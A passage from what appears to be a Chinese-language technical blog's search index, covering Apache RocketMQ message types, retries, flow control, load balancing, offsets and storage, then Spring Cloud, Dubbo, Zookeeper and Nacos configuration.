说明：服务端回查的间隔时间和最大回查次数，请参见参数限制。\n生产者收到消息回查后，需要检查对应消息的本地事务执行的最终结果。\n生产者根据检查到的本地事务的最终状态再次提交二次确认，服务端仍按照步骤4对半事务消息进行处理。\n\n事务消息生命周期\n\n初始化：半事务消息被生产者构建并完成初始化，待发送到服务端的状态。\n事务待提交：半事务消息被发送到服务端，和普通消息不同，并不会直接被服务端持久化，而是会被单独存储到事务存储系统中，等待第二阶段本地事务返回执行结果后再提交。此时消息对下游消费者不可见。\n消息回滚：第二阶段如果事务执行结果明确为回滚，服务端会将半事务消息回滚，该事务消息流程终止。\n（提交）待消费：第二阶段如果事务执行结果明确为提交，服务端会将半事务消息重新存储到普通存储系统中，此时消息对下游消费者可见，等待被消费者获取并消费。\n消费中：同普通消息的生命周期\n消费提交：同普通消息的生命周期\n消息删除：同普通消息的生命周期\n\n定时&#x2F;延时消息在分布式定时调度触发、任务超时处理等场景，需要实现精准、可靠的定时事件触发。使用 Apache RocketMQ 的定时消息可以简化定时调度任务的开发逻辑，实现高性能、可扩展、高可靠的定时触发能力。\n\n定时消息：例如，当前系统时间为2022-06-09 17:30:00，您希望消息在下午19:20:00定时投递，则定时时间为2022-06-09 19:20:00，转换成时间戳格式为1654773600000。\n延时消息：例如，当前系统时间为2022-06-09 17:30:00，您希望延时1个小时后投递消息，则您需要根据当前时间和延时时长换算成定时时刻，即消息投递时间为2022-06-09 18:30:00，转换为时间戳格式为1654770600000。\n\n定时消息仅支持在 MessageType为Delay 的主题内使用，即定时消息只能发送至类型为定时消息的主题中，发送的消息的类型必须和主题的类型一致。\n应用场景\n\n典型场景一：分布式定时调度\n在分布式定时调度场景下，需要实现各类精度的定时任务，例如每天5点执行文件清理，每隔2分钟触发一次消息推送等需求。传统基于数据库的定时调度方案在分布式场景下，性能不高，实现复杂。基于 Apache RocketMQ 的定时消息可以封装出多种类型的定时触发器。\n\n典型场景二：任务超时处理\n以电商交易场景为例，订单下单后暂未支付，此时不可以直接关闭订单，而是需要等待一段时间后才能关闭订单。使用 Apache RocketMQ 定时消息可以实现超时任务的检查触发。\n\n\n定时消息生命周期\n\n初始化：同普通消息的生命周期\n定时中：消息被发送到服务端，和普通消息不同的是，服务端不会直接构建消息索引，而是会将定时消息单独存储在定时存储系统中，等待定时时刻到达。\n待消费：定时时刻到达后，服务端将消息重新写入普通存储引擎，对下游消费者可见，等待消费者消费的状态。\n消费中：同普通消息的生命周期\n消费提交：同普通消息的生命周期\n消息删除：同普通消息的生命周期\n\n消息处理原理消息发送重试Apache RocketMQ 客户端连接服务端发起消息发送请求时，可能会因为网络故障、服务异常等原因导致调用失败。为保证消息的可靠性， Apache RocketMQ 在客户端SDK中内置请求重试逻辑，尝试通过重试发送达到最终调用成功的效果。\n同步发送和异步发送模式均支持消息发送重试。\n 重试触发条件\n触发消息发送重试机制的条件包含调用失败、请求超时、连接失败或返回失败错误码，具体场景包含如下：\n\n客户端消息发送请求调用失败或请求超时\n网络异常造成连接失败或请求超时。\n服务端节点处于重启或下线等状态造成连接失败。\n服务端运行慢造成请求超时。\n服务端返回失败错误码\n系统逻辑错误：因运行逻辑不正确造成的错误。\n系统流控错误：因容量超限造成的流控错误。\n\n\n\n对于事务消息，只会进行透明重试（transparent retries），请求超时或异常等场景不会进行重试。\n重试流程生产者在初始化时设置消息发送最大重试次数，当出现上述触发条件的场景时，生产者客户端会按照设置的重试次数一直重试发送消息，直到消息发送成功或达到最大重试次数重试结束，并在最后一次重试失败后返回调用错误响应。\n\n同步发送：调用线程会一直阻塞，直到某次重试成功或最终重试失败，抛出错误码和异常。\n异步发送：调用线程不会阻塞，但调用结果会通过异常事件或者成功事件返回。\n\n功能约束\n链路耗时阻塞评估：从上述重试机制可以看出，在重试流程中生产者仅能控制最大重试次数。若由于系统异常触发了SDK内置的重试逻辑，则服务端需要等待最终重试结果，可能会导致消息发送请求链路被阻塞。对于某些实时调用类场景，您需要合理评估每次调用请求的超时时间以及最大重试次数，避免影响全链路的耗时。\n最终异常兜底： Apache RocketMQ 客户端内置的发送请求重试机制并不能保证消息发送一定成功。当最终重试仍然失败时，业务方调用需要捕获异常，并做好冗余保护处理，避免消息发送结果不一致。\n消息重复问题：因远程调用的不确定性，当Apache RocketMQ客户端因请求超时触发消息发送重试流程，此时客户端无法感知服务端的处理结果，客户端进行的消息发送重试可能会产生消息重复问题，业务逻辑需要自行处理消息重复问题。\n\n消息消费重试消费重试策略概述消费重试指的是，消费者在消费某条消息失败后，Apache RocketMQ 服务端会根据重试策略重新消费该消息，超过一次定数后若还未消费成功，则该消息将不再继续重试，直接被发送到死信队列中。\n消息重试的触发条件\n\n消费失败，包括消费者返回消息失败状态标识或抛出非预期异常。\n消息处理超时，包括在PushConsumer中排队超时。\n\n消息重试策略主要行为\n\n重试过程状态机：控制消息在重试流程中的状态和变化逻辑。\n重试间隔：上一次消费失败或超时后，下次重新尝试消费的间隔时间。\n最大重试次数：消息可被重试消费的最大次数。\n\n消费重试策略PushConsumerPushConsumer消费消息时，消息的几个主要状态如下（重试状态机）：\n\nReady：已就绪状态。消息在Apache RocketMQ服务端已就绪，可以被消费者消费。\n\nInflight：处理中状态。消息被消费者客户端获取，处于消费中还未返回消费结果的状态。\n\nWaitingRetry：待重试状态，PushConsumer独有的状态。当消费者消息处理失败或消费超时，会触发消费重试逻辑判断。如果当前重试次数未达到最大次数，则该消息变为待重试状态，经过重试间隔后，消息将重新变为已就绪状态可被重新消费。多次重试之间，可通过重试间隔进行延长，防止无效高频的失败。\n\nCommit：提交状态。消费成功的状态，消费者返回成功响应即可结束消息的状态机。\n\nDLQ：死信状态。消费逻辑的最终兜底机制，若消息一直处理失败并不断进行重试，直到超过最大重试次数还未成功，此时消息不会再重试，会被投递至死信队列。您可以通过消费死信队列的消息进行业务恢复。\n\n\n消息重试过程中，每次重试消息状态都会经过已就绪&gt;处理中&gt;待重试的变化，两次消费间的间隔时间实际由消费耗时及重试间隔控制，消费耗时的最大上限受服务端系统参数控制，一般不应该超过上限时间。\nSimpleConsumer重试状态机\nSimpleConsumer消费消息时，消息的几个主要状态如下：\n\nReady：已就绪状态。消息在Apache RocketMQ服务端已就绪，可以被消费者消费。\n\nInflight：处理中状态。消息被消费者客户端获取，处于消费中还未返回消费结果的状态。\n\nCommit：提交状态。消费成功的状态，消费者返回成功响应即可结束消息的状态机。\n\nDLQ：死信状态。消费逻辑的最终兜底机制，若消息一直处理失败并不断进行重试，直到超过最大重试次数还未成功，此时消息不会再重试，会被投递至死信队列。您可以通过消费死信队列的消息进行业务恢复。\n\n\n消息流控消息流控指的是系统容量或水位过高， Apache RocketMQ 服务端会通过快速失败返回流控错误来避免底层资源承受过高压力。\n触发条件Apache RocketMQ 的消息流控触发条件如下：\n\n存储压力大：参考消费进度管理的原理机制，消费者分组的初始消费位点为当前队列的最大消费位点。若某些场景例如业务上新等需要回溯到指定时刻前开始消费，此时队列的存储压力会瞬间飙升，触发消息流控。\n服务端请求任务排队溢出：若消费者消费能力不足，导致队列中有大量堆积消息，当堆积消息超过一定数量后会触发消息流控，减少下游消费系统压力。\n\n流控行为当系统触发消息发送流控时，客户端会收到系统限流错误和异常，错误码信息如下：\n\nreply-code：530\nreply-text：TOO_MANY_REQUESTS\n\n客户端收到系统流控错误码后，会根据指数退避策略进行消息发送重试。\n处理建议\n\n如何避免触发消息流控：触发限流的根本原因是系统容量或水位过高，您可以利用可观测性功能监控系统水位容量等，保证底层资源充足，避免触发流控机制。\n突发消息流控处理：如果因为突发原因触发消息流控，且客户端内置的重试流程执行失败，则建议业务方将请求调用临时替换到其他系统进行应急处理。\n\n消息过滤功能概述消息过滤定义\n过滤的含义指的是将符合条件的消息投递给消费者，而不是将匹配到的消息过滤掉。\nApache RocketMQ 的消息过滤功能通过生产者和消费者对消息的属性、标签进行定义，并在 Apache RocketMQ 服务端根据过滤条件进行筛选匹配，将符合条件的消息投递给消费者进行消费。\n消息过滤主要解决的单个业务域即同一个主题内不同消息子集的过滤问题，一般是基于同一业务下更具体的分类进行过滤匹配。如果是需要对不同业务域的消息进行拆分，建议使用不同主题处理不同业务域的消息。\n消息过滤原理\n消息过滤主要通过以下几个关键流程实现：\n\n生产者：生产者在初始化消息时预先为消息设置一些属性和标签，用于后续消费时指定过滤目标。\n消费者：消费者在初始化及后续消费流程中通过调用订阅关系注册接口，向服务端上报需要订阅指定主题的哪些消息，即过滤条件。\n服务端：消费者获取消息时会触发服务端的动态过滤计算，Apache RocketMQ 服务端根据消费者上报的过滤条件的表达式进行匹配，并将符合条件的消息投递给消费者。\n\n消息过滤分类Apache RocketMQ 支持Tag标签过滤和SQL属性过滤。\n\nTag标签过滤方式是生产者在发送消息时，设置消息的Tag标签，消费者需指定已有的Tag标签来进行匹配订阅。\n\nSQL属性过滤方式是是生产者定义消息属性，消费者设置SQL过滤条件。生产者发送消息时可以自定义消息属性，每个属性都是一个自定义的键值对（Key-Value）。生产者在发送消息时可设置多个属性，消费者订阅时可设置SQL语法的过滤表达式过滤多个属性。\n\n\n消费者负载均衡消费者从 Apache RocketMQ 获取消息消费时，通过消费者负载均衡策略，可将主题内的消息分配给指定消费者分组中的多个消费者共同分担，提高消费并发能力和消费者的水平扩展能力。\n广播消费和共享消费在 Apache RocketMQ 领域模型中，同一条消息支持被多个消费者分组订阅，同时，对于每个消费者分组可以初始化多个消费者。\n可以根据消费者分组和消费者的不同组合，实现以下两种不同的消费效果：\n\n\n消费组间广播消费 ：如上图所示，每个消费者分组只初始化唯一一个消费者，每个消费者可消费到消费者分组内所有的消息，各消费者分组都订阅相同的消息，以此实现单客户端级别的广播一对多推送效果。\n该方式一般可用于网关推送、配置推送等场景。\n\n消费组内共享消费 ：如上图所示，每个消费者分组下初始化了多个消费者，这些消费者共同分担消费者分组内的所有消息，实现消费者分组内流量的水平拆分和均衡负载。\n该方式一般可用于微服务解耦场景。\n\n\n消费者负载均衡策略如上文所述，消费组间广播消费场景下，每个消费者分组内只有一个消费者，因此不涉及消费者的负载均衡。\n消费组内共享消费场景下，消费者分组内多个消费者共同分担消息，消息按照哪种逻辑分配给哪个消费者，就是由消费者负载均衡策略所决定的。\n根据消费者类型的不同，消费者负载均衡策略分为以下两种模式：\n\n消息粒度负载均衡：PushConsumer和SimpleConsumer默认负载策略\n队列粒度负载均衡：PullConsumer默认负载策略\n\n消息粒度负载均衡策略原理\n消息粒度负载均衡策略中，同一消费者分组内的多个消费者将按照消息粒度平均分摊主题中的所有消息，即同一个队列中的消息，可被平均分配给多个消费者共同消费。\n\n如上图所示，消费者分组Group A中有三个消费者A1、A2和A3，这三个消费者将共同消费主题中同一队列Queue1中的多条消息。 \n注意：消息粒度负载均衡策略保证同一个队列的消息可以被多个消费者共同处理，但是该策略使用的消息分配算法结果是随机的，并不能指定消息被哪一个特定的消费者处理。\n消息粒度的负载均衡机制，是基于内部的单条消息确认语义实现的。消费者获取某条消息后，服务端会将该消息加锁，保证这条消息对其他消费者不可见，直到该消息消费成功或消费超时。因此，即使多个消费者同时消费同一队列的消息，服务端也可保证消息不会被多个消费者重复消费。\n顺序消息负载机制\n在顺序消息中，消息的顺序性指的是同一消息组内的多个消息之间的先后顺序。因此，顺序消息场景下，消息粒度负载均衡策略还需要保证同一消息组内的消息，按照服务端存储的先后顺序进行消费。不同消费者处理同一个消息组内的消息时，会严格按照先后顺序锁定消息状态，确保同一消息组的消息串行消费。\n\n如上图所述，队列Queue1中有4条顺序消息，这4条消息属于同一消息组G1，存储顺序由M1到M4。在消费过程中，前面的消息M1、M2被消费者Consumer A1处理时，只要消费状态没有提交，消费者A2是无法并行消费后续的M3、M4消息的，必须等前面的消息提交消费状态后才能消费后面的消息。\n策略特点\n相对于队列粒度负载均衡策略，消息粒度负载均衡策略有以下特点：\n\n消费分摊更均衡\n传统队列级的负载均衡策略中，如果队列数量和消费者数量不均衡，则可能会出现部分消费者空闲，或部分消费者处理过多消息的情况。消息粒度负载均衡策略无需关注消费者和队列的相对数量，能够更均匀地分摊消息。\n\n对非对等消费者更友好\n对于线上生产环境，由于网络机房分区延迟、消费者物理资源规格不一致等原因，消费者的处理能力可能会不一致，如果按照队列分配消息，则可能出现部分消费者消息堆积、部分消费者空闲的情况。消息粒度负载均衡策略按需分配，消费者处理任务更均衡。\n\n队列分配运维更方便\n传统基于绑定队列的负载均衡策略，必须保证队列数量大于等于消费者数量，以免产生部分消费者获取不到队列出现空转的情况，而消息粒度负载均衡策略则无需关注队列数。\n\n\n适用场景\n消息粒度消费负载均衡策略下，同一队列内的消息离散地分布于多个消费者，适用于绝大多数在线事件处理的场景。只需要基本的消息处理能力，对消息之间没有批量聚合的诉求。而对于流式处理、聚合计算场景，需要明确地对消息进行聚合、批处理时，更适合使用队列粒度的负载均衡策略。\n队列粒度负载均衡策略原理\n队列粒度负载均衡策略中，同一消费者分组内的多个消费者将按照队列粒度消费消息，即每个队列仅被一个消费者消费。\n\n如上图所示，主题中的三个队列Queue1、Queue2、Queue3被分配给消费者分组中的两个消费者，每个队列只能分配给一个消费者消费，该示例中由于队列数大于消费者数，因此，消费者A2被分配了两个队列。若队列数小于消费者数量，可能会出现部分消费者无绑定队列的情况。\n队列粒度的负载均衡，基于队列数量、消费者数量等运行数据进行统一的算法分配，将每个队列绑定到特定的消费者，然后每个消费者按照取消息&gt;提交消费位点&gt;持久化消费位点的消费语义处理消息，取消息过程不提交消费状态，因此，为了避免消息被多个消费者重复消费，每个队列仅支持被一个消费者消费。\n备注：队列粒度负载均衡策略保证同一个队列仅被一个消费者处理，该策略的实现依赖消费者和服务端的信息协商机制，Apache RocketMQ 并不能保证协商结果完全强一致。因此，在消费者数量、队列数量发生变化时，可能会出现短暂的队列分配结果不一致，从而导致少量消息被重复处理。\n策略特点\n相对于消息粒度负载均衡策略，队列粒度负载均衡策略分配粒度较大，不够灵活。但该策略在流式处理场景下有天然优势，能够保证同一队列的消息被相同的消费者处理，对于批量处理、聚合处理更友好。\n适用场景\n队列粒度负载均衡策略适用于流式计算、数据聚合等需要明确对消息进行聚合、批处理的场景。\n消费进度管理消息位点Apache RocketMQ 通过消费位点（Offset）管理消费进度。\n参考 Apache RocketMQ 主题和队列的定义，消息是按到达服务端的先后顺序存储在指定主题的多个队列中，每条消息在队列中都有一个唯一的Long类型坐标，这个坐标被定义为消息位点。\n任意一个消息队列在逻辑上都是无限存储，即消息位点会从0到Long.MAX无限增加。通过主题、队列和位点就可以定位任意一条消息的位置。\nApache RocketMQ 定义队列中最早一条消息的位点为最小消息位点（MinOffset）；最新一条消息的位点为最大消息位点（MaxOffset）。虽然消息队列逻辑上是无限存储，但由于服务端物理节点的存储空间有限， Apache RocketMQ 会滚动删除队列中存储最早的消息。因此，消息的最小消费位点和最大消费位点会一直递增变化。 \n\n消费位点Apache RocketMQ 通过消费位点（ConsumerOffset）管理消息的消费进度。每条消息被某个消费者消费完成后不会立即在队列中删除，Apache RocketMQ 会基于每个消费者分组维护一份消费记录，该记录指定消费者分组消费某一个队列时，消费过的最新一条消息的位点，即消费位点。\n当消费者客户端离线，又再次重新上线时，会严格按照服务端保存的消费进度继续处理消息。如果服务端保存的历史位点信息已过期被删除，此时消费位点向前移动至服务端存储的最小位点。\n队列中消息位点MinOffset、MaxOffset和每个消费者分组的消费位点ConsumerOffset的关系如下：\n\n\nConsumerOffset≤MaxOffset：\n当消费速度和生产速度一致，且全部消息都处理完成时，最大消息位点和消费位点相同，即ConsumerOffset&#x3D;MaxOffset。\n当消费速度较慢小于生产速度时，队列中会有部分消息未消费，此时消费位点小于最大消息位点，即ConsumerOffset&lt;MaxOffset，两者之差就是该队列中堆积的消息量。\n\n\nConsumerOffset≥MinOffset：正常情况下有效的消费位点ConsumerOffset必然大于等于最小消息位点MinOffset。消费位点小于最小消息位点时是无效的，相当于消费者要消费的消息已经从队列中删除了，是无法消费到的，此时服务端会将消费位点强制纠正到合法的消息位点。\n\n消费位点初始值\n消费位点初始值指的是消费者分组首次启动消费者消费消息时，服务端保存的消费位点的初始值。\nApache RocketMQ 定义消费位点的初始值为消费者首次获取消息时，该时刻队列中的最大消息位点。相当于消费者将从队列中最新的消息开始消费。\n重置消费位点若消费者分组的初始消费位点或当前消费位点不符合您的业务预期，可以通过重置消费位点调整消费进度。\n适用场景\n\n初始消费位点不符合需求：因初始消费位点为当前队列的最大消息位点，即客户端会直接从最新消息开始消费。若业务上线时需要消费部分历史消息，您可以通过重置消费位点功能消费到指定时刻前的消息。\n消费堆积快速清理：当下游消费系统性能不足或消费速度小于生产速度时，会产生大量堆积消息。若这部分堆积消息可以丢弃，您可以通过重置消费位点快速将消费位点更新到指定位置，绕过这部分堆积的消息，减少下游处理压力。\n业务回溯，纠正处理：由于业务消费逻辑出现异常，消息被错误处理。若您希望重新消费这些已被处理的消息，可以通过重置消费位点快速将消费位点更新到历史指定位置，实现消费回溯。\n\n重置功能\nApache RocketMQ 的重置消费位点提供以下能力：\n\n重置到队列中的指定位点。\n重置到某一时刻对应的消费位点，匹配位点时，服务端会根据自动匹配到该时刻最接近的消费位点。\n\n使用限制\n\n重置消费位点后消费者将直接从重置后的位点开始消费，对于回溯重置类场景，重置后的历史消息大多属于存储冷数据，可能会造成系统压力上升，一般称为冷读现象。因此，需要谨慎评估重置消费位点后的影响。建议严格控制重置消费位点接口的调用权限，避免无意义、高频次的消费位点重置。\nApache RocketMQ 重置消费位点功能只能重置对消费者可见的消息，不能重置定时中、重试等待中的消息。更多信息，请参见定时&#x2F;延时消息和消费重试。\n\n消息存储原理CommitLogRocketMQ单个Broker实例下的所有队列共用一个日志数据文件（CommitLog）来存储。而Kafka采用的是独立型的存储结构，每个队列一个文件。\nCommitLog的文件大小默认是1G（1G &#x3D; 1073741824byte），文件名是字节的起始偏移量，文件名长度是20位，左边补零。\nConsumerQueueConsumerQueue（逻辑消费队列）可以看成是基于Topic和QueueId的CommitLog索引文件，提供了一种可以通过Topic和QueueId来查询消息队列的方法。\n由于RocketMQ是基于主题（Topic）的订阅模式，消息消费是针对主题进行的，如果遍历CommitLog文件，根据Topic检索消息是非常低效的。使用ConsumerQueue可以快速查找CommitLog中待消费的消息。\nIndexFileIndexFile（索引文件）可以看成是基于Key或时间区间的CommitLog索引文件。提供了一种可以通过Key或时间区间来查询消息的方法。\n页缓存与内存映射页缓存（Page Cache）是操作系统（OS）对文件的缓存，用于加速对文件的读写，实现原理是OS将一部分内存用作PageCache，对于数据的写入，OS会先写入Cache内，然后通过异步的方式将Cache内的数据刷至物理磁盘上。\nRocketMQ中的ConsumerQueue就是基于页缓存机制达到读写速度接近内存读写速度。\nRocketMQ主要通过MappedByteBuffer对文件进行读写操作，MappedByteBuffer是 Java NIO 中的一个类，它提供了一种将文件的内容映射到进程的地址空间中，使得可以像访问内存一样来访问文件的内容（内存映射）的方法。\n消息刷盘RocketMQ支持的消息刷盘包括同步刷盘和异步刷盘两种，指定了消息是否真正持久化道Broker磁盘后才给Producer反馈。\n\n同步刷盘：只有在消息真正持久化道磁盘后，Broker端才会真正返回给Producer端一个成功的ACK响应。\n异步刷盘：只要消息写入PageCache，Broker就返回给Producer端ACK响应。这种方式能够充分利用OS的页缓存机制的优势。\n\nReferences\nhttps://rocketmq.apache.org/\nhttps://github.com/apache/rocketmq\nhttps://rocketmq.apache.org/zh/\n\n","categories":["IT"],"tags":["RocketMQ"]},{"title":"Spring Cloud","url":"/2023/05/24/Spring-Cloud/","content":"微服务架构微服务架构是一种一个单一应用程序开发为一组小型服务的代码结构，每个服务运行在自己的进程中，服务间采用轻量级通信机制（如HTTP）进行通信。这些服务可以独立部署，不同服务可以使用不同语言开发，使用不同的数据存储技术。\n微服务与Spring Cloud为了降低构建和维护分布式系统的难度，加快微服务的落地，Spring Cloud提供了快速构建分布式微服务系统的一些常用功能，如配置管理、服务发现、断路器、路由、服务代理、控制总线等工具。使用这些工具可以快速构建分布式微服务架构的系统。\nSpring Cloud与DubboDubboApache Dubbo 是一款 RPC 服务开发框架，用于解决微服务架构下的服务治理与通信问题。利用 Dubbo 提供的丰富服务治理特性，可以实现诸如服务发现、负载均衡、流量调度等服务治理诉求。\n官网对Dubbo的含义的介绍：\n\nDubbo的产生原因：微服务的分布式特性，使得应用间的依赖、网络交互、数据传输变得更频繁，因此不同的应用需要定义、暴露或调用 RPC 服务，那么这些 RPC 服务如何定义、如何与应用开发框架结合、服务调用行为如何控制？\nDubbo的含义：Dubbo 在微服务应用开发框架之上抽象了一套 RPC 服务定义、暴露、调用与治理的编程范式。\n\nDubbo支持的注册中心的官网介绍。\nSpring Cloud与Dubbo的区别Dubbo主要用来实现服务治理，而Spring Cloud的各个组件实现了微服务架构下的所需的各种功能，服务治理只是其中的一个方面。\nDubbo的在Spring Cloud Netfix技术架构中的替代方案可以是，通过Consul或Eureka Server等实现服务注册中心（对应Dubbo中的注册中心），通过Ribbon实现软负载均衡。 \nSpring Cloud Netfix和Spring Cloud AlibabaSpring Cloud Netfix和Spring Cloud Alibaba是Spring Cloud的两套技术架构。\nSpring Cloud NetfixSpring Cloud Netfix在官方文档中介绍：该项目通过自动配置和绑定到Spring环境和其他Spring编程模型的习惯方式来为Spring Boot应用程序提供Netflix OSS集成。通过几个简单的注释，您可以快速启用和配置应用程序中的常见模式，并通过经过测试的Netflix组件构建大型分布式系统。提供的组件包括服务发现（Eureka），断路器（Hystrix），智能路由（Zuul）和客户端负载平衡（Ribbon）。可以从Netfix的GitHub中找到这些组件。\nSpring Cloud AlibabaSpring Cloud Alibaba的相关文档：Spring Cloud Alibaba参考文档、Spring Cloud Alibaba中文版README.md。其提供的组件有：Sentinel(分布式流控：流量控制、熔断降级、系统负载保护等多个维度保护服务的稳定性)、Nacos（注册中心）、RocketMQ（分布式消息组件）、Seata（分布式事务组件）等。\n服务注册中心和配置中心服务注册中心提供了服务注册和服务发现功能\n\n服务注册：所有服务的提供方启动时向注册中心发送自己的信息，包括地址、端口、提供的服务等。\n服务发现：当服务调用方需要调用服务时，只需要向注册中心查询谁提供了自己需要的服务。\n\nZookeeper（注册中心和配置中心）功能Zookeeper可以解决分布式应用中的服务的注册和发现、统一命名服务、状态同步服务、集群管理、分布式应用配置管理等问题。可以替代Eureka、Spring Cloud Config。不能替代路由网关（Zuul）、负载均衡（Ribbon）、断路器（Hystricx）等。\n使用方法\n启动Zookeeper的服务，可以使用Docker等方法启动Zookeeper。\n在Zookeeper服务提供方：\n添加依赖spring-cloud0zookeeper-discovery和org.apache.curator。注：Zookeeper通过Curator（Curator 是一个 Apache ZooKeeper 客户端框架）实现了服务注册和发现功能，实现了和Eureka相同的功能。\n在配置文件中添加对Zookeeper的配置，指定Zookeeper服务暴露的的连接ip和端口。\n在启动类添加@EnableDiscoveryClient注解。\n\n\n在服务消费方：\n添加依赖\n添加配置信息\n\n\n\nNacos（注册中心和配置中心）功能和特性Nacos &#x2F;nɑ:kəʊs&#x2F; 是 Dynamic Naming and Configuration Service的首字母简称，一个更易于构建云原生应用的动态服务发现、配置管理和服务管理平台。\nNacos官网给出的关键特性包括:\n\n服务发现和服务健康监测\nNacos 支持基于 DNS 和基于 RPC 的服务发现。服务提供者使用 原生SDK、OpenAPI、或一个独立的Agent TODO注册 Service 后，服务消费者可以使用DNS TODO 或HTTP&amp;API查找和发现服务。\nNacos 提供对服务的实时的健康检查，阻止向不健康的主机或服务实例发送请求。Nacos 支持传输层 (PING 或 TCP)和应用层 (如 HTTP、MySQL、用户自定义）的健康检查。 对于复杂的云环境和网络拓扑环境中（如 VPC、边缘网络等）服务的健康检查，Nacos 提供了 agent 上报模式和服务端主动检测2种健康检查模式。Nacos 还提供了统一的健康检查仪表盘，帮助您根据健康状态管理服务的可用性及流量。\n\n动态配置服务\n动态配置服务可以让您以中心化、外部化和动态化的方式管理所有环境的应用配置和服务配置。\n动态配置消除了配置变更时重新部署应用和服务的需要，让配置管理变得更加高效和敏捷。\n配置中心化管理让实现无状态服务变得更简单，让服务按需弹性扩展变得更容易。\nNacos 提供了一个简洁易用的UI (控制台样例 Demo) 帮助您管理所有的服务和应用的配置。Nacos 还提供包括配置版本跟踪、金丝雀发布、一键回滚配置以及客户端配置更新状态跟踪在内的一系列开箱即用的配置管理特性，帮助您更安全地在生产环境中管理配置变更和降低配置变更带来的风险。\n\n动态 DNS 服务\n动态 DNS 服务支持权重路由，让您更容易地实现中间层负载均衡、更灵活的路由策略、流量控制以及数据中心内网的简单DNS解析服务。动态DNS服务还能让您更容易地实现以 DNS 协议为基础的服务发现，以帮助您消除耦合到厂商私有服务发现 API 上的风险。\nNacos 提供了一些简单的 DNS APIs TODO 帮助您管理服务的关联域名和可用的 IP:PORT 列表.\n\n服务及其元数据管理\nNacos 能让您从微服务平台建设的视角管理数据中心的所有服务及元数据，包括管理服务的描述、生命周期、服务的静态依赖分析、服务的健康状态、服务的流量管理、路由及安全策略、服务的 SLA 以及最首要的 metrics 统计数据。\n\n\n使用方法\n在创建的SpringBoot项目中添加依赖nacos-discovery-spring-boot- starter\n创建Controller类，通过@NacosInjected注入Nacos的NamingService，并提供discovery方法用于根据服务名称获取注册到Nacos上的服务地址\n添加对Nacos服务地址的配置\n\n高可用在分布式架构中，任何中间件或者应用都不允许单点存在，所以开源组件一般都会支持高可用的集群。Nacos的集群架构类似于Zookeeper，包含一个Leader节点和多个Follower节点，和Zookeeper不同的是，它的数据一致性算法使用的是Raft。\nNacos支持Derby和MySQL两种持久化机制，默认使用的是Derby数据库，Derby的吞吐量没有MySQL大，生产环境中可以使用MySQL替换，如果使用M有SQL，需要运行nacos-mysql-sql脚本创建数据库和表。\nDubbo使用Nacos作为注册中心\n官方文档：Dubbo x Spring Boot 开发\n\n\n在一个Maven项目（spring-boot-dubbo-sample）中添加三个模块，分别用来声明接口、实现接口和使用接口的实现类。\n\n在声明接口的模块（nacos-sample-interface）中声明接口，打包安装模块。\n\n在实现接口的模块（nacos-sample-provider）中添加三个依赖nacos-discovery-spring-boot-starter（Nacos的Starter组件）、dubbo-spring-boot-starter（Dubbo的Starter组件）以及nacos-sample-api（声明接口的模块名）；\n创建接口的实现类，并在实现类中添加@DubboService 注解（@Service 注解从 3.0 版本开始就已经废弃，改用 @DubboService，以区别于 Spring 的 @Service 注解）；配置Dubbo 的应用名（dubbo.application.name）、Dubbo 协议信息（dubbo.protocol）、Dubbo 使用的注册中心地址（dubbo.register.adderss）等信息。配置示例：\ndubbo:  application:    name: nacos-sample-provider  protocol:    name: dubbo    port: -1  registry:    address: nacos://127.0.0.1:8848    #如果使用Zookeeper作为注册中心，只需要修改此address如下    #address: zookeeper:127.0.0.1:2181\n\n在启动类中添加注解@EnableDubbo。\n\n在使用接口的实现类的模块（nacos-sample-consumer）使用@DubboReference注解（@Reference 注解从 3.0 版本开始就已经废弃，改用 @DubboReference，以区别于 Spring 的 @Reference 注解）即可获取nacos-sample-provider中的实现类对象；在配置文件中配置Dubbo 的应用名、Dubbo 协议信息、Dubbo 使用的注册中心地址；在启动类中添加注解@EnableDubbo。\n\n\nNacos源码（待完善）根据注册中心的主要功能确定Nacos源码关键的部分有：服务注册、服务地址的获取、服务变化的感知。\n\n服务注册\n服务地址的获取\n服务变化的感知\n\nNacos作为配置中心使用方法：\n\n引入依赖spring-cloud-starter-alibaba-nacos-config。\n添加配置，使用 bootstrap.properties 配置文件来配置Nacos Server 地址、文件扩展名。\n\n特性：\n\nspring-cloud-starter-alibaba-nacos-config 支持配置的动态更新\n可以通过配置 spring.cloud.nacos.config.refresh.enabled=false 来关闭动态刷新\n\n可支持profile粒度的配置\nspring-cloud-starter-alibaba-nacos-config 在加载配置的时候，不仅仅加载了以 dataId 为 $&#123;spring.application.name&#125;.$&#123;file-extension:properties&#125; 为前缀的基础配置，还加载了dataId为 $&#123;spring.application.name&#125;-$&#123;profile&#125;.$&#123;file-extension:properties&#125; 的基础配置。在日常开发中如果遇到多套环境下的不同配置，可以通过Spring 提供的 $&#123;spring.profiles.active&#125; 这个配置项来配置。\nspring.profiles.active=develop\n\n支持自定义 namespace 的配置\n首先看一下 Nacos 的 Namespace 的概念， Nacos 概念\n\n用于进行租户粒度的配置隔离。不同的命名空间下，可以存在相同的 Group 或 Data ID 的配置。Namespace 的常用场景之一是不同环境的配置的区分隔离，例如开发测试环境和生产环境的资源（如配置、服务）隔离等。\n\n在没有明确指定 $&#123;spring.cloud.nacos.config.namespace&#125; 配置的情况下， 默认使用的是 Nacos 上 Public 这个namespace。如果需要使用自定义的命名空间，可以通过以下配置来实现：\nspring.cloud.nacos.config.namespace=b3404bc0-d7dc-4855-b519-570ed34b62d7\n\n该配置必须放在 bootstrap.properties 文件中。此外 spring.cloud.nacos.config.namespace 的值是 namespace 对应的 id，id 值可以在 Nacos 的控制台获取。并且在添加配置时注意不要选择其他的 namespace，否则将会导致读取不到正确的配置。\n\n支持自定义 Group 的配置\n在没有明确指定 $&#123;spring.cloud.nacos.config.group&#125; 配置的情况下， 默认使用的是 DEFAULT_GROUP 。如果需要自定义自己的 Group，可以通过以下配置来实现：\nspring.cloud.nacos.config.group=DEVELOP_GROUP\n\n该配置必须放在 bootstrap.properties 文件中。并且在添加配置时 Group 的值一定要和 spring.cloud.nacos.config.group 的配置值一致。\n\n支持自定义扩展的 Data Id 配置\nSpring Cloud Alibaba Nacos Config 从 0.2.1 版本后，可支持自定义 Data Id 的配置。关于这部分详细的设计可参考 这里。 一个完整的配置案例如下所示：\nspring.application.name=opensource-service-providerspring.cloud.nacos.config.server-addr=127.0.0.1:8848# config external configuration# 1、Data Id 在默认的组 DEFAULT_GROUP,不支持配置的动态刷新spring.cloud.nacos.config.extension-configs[0].data-id=ext-config-common01.properties# 2、Data Id 